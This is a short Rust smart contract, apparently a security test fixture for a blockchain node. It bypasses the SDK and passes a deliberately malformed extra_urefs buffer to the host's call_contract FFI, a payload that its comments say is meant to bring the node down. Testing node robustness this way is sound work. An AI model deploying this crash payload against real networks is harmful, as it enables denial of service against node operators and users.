#![no_std]
#![feature(alloc, cell_update)]

#[macro_use]
extern crate alloc;

extern crate cl_std;
extern crate core;

use alloc::collections::btree_map::BTreeMap;
use alloc::vec::Vec;

use cl_std::bytesrepr::ToBytes;
use cl_std::contract_api;
use cl_std::contract_api::argsparser::ArgsParser;
use cl_std::contract_api::pointers::ContractPointer;
use cl_std::key::Key;

#[no_mangle]
pub extern "C" fn do_nothing() {
    // A function that does nothing.
    // This is used to just pass the checks in `call_contract` on the host side.
}

// Attacker copied to_ptr from `alloc_utils` as it was private
fn to_ptr<T: ToBytes>(t: &T) -> (*const u8, usize, Vec<u8>) {
    let bytes = t.to_bytes().expect("Unable to serialize data");
    let ptr = bytes.as_ptr();
    let size = bytes.len();
    (ptr, size, bytes)
}

mod malicious_ffi {
    // Potential attacker has available every FFI for himself
    extern "C" {
        pub fn call_contract(
            key_ptr: *const u8,
            key_size: usize,
            args_ptr: *const u8,
            args_size: usize,
            extra_urefs_ptr: *const u8,
            extra_urefs_size: usize,
        ) -> usize;
    }
}

// This is half-baked contract_api::call_contract with changed `extra_urefs` parameter
// with a desired payload that's supposed to bring the node down.
fn my_call_contract<A: ArgsParser>(c_ptr: ContractPointer, args: &A) {
    let contract_key: Key = c_ptr.into();
    let (key_ptr, key_size, _bytes1) = to_ptr(&contract_key);
    let (args_ptr, args_size, _bytes2) = ArgsParser::parse(args).map(|args| to_ptr(&args)).unwrap();

    let mut extra_urefs = vec![255, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    let _res_size = unsafe {
        malicious_ffi::call_contract(
            key_ptr,
            key_size,
            args_ptr,
            args_size,
            extra_urefs.as_mut_ptr(),
            extra_urefs.len(),
        )
    };
}

#[no_mangle]
pub extern "C" fn call() {
    let do_nothing: ContractPointer = contract_api::store_function("do_nothing", BTreeMap::new());
    my_call_contract(do_nothing.clone(), &());
}
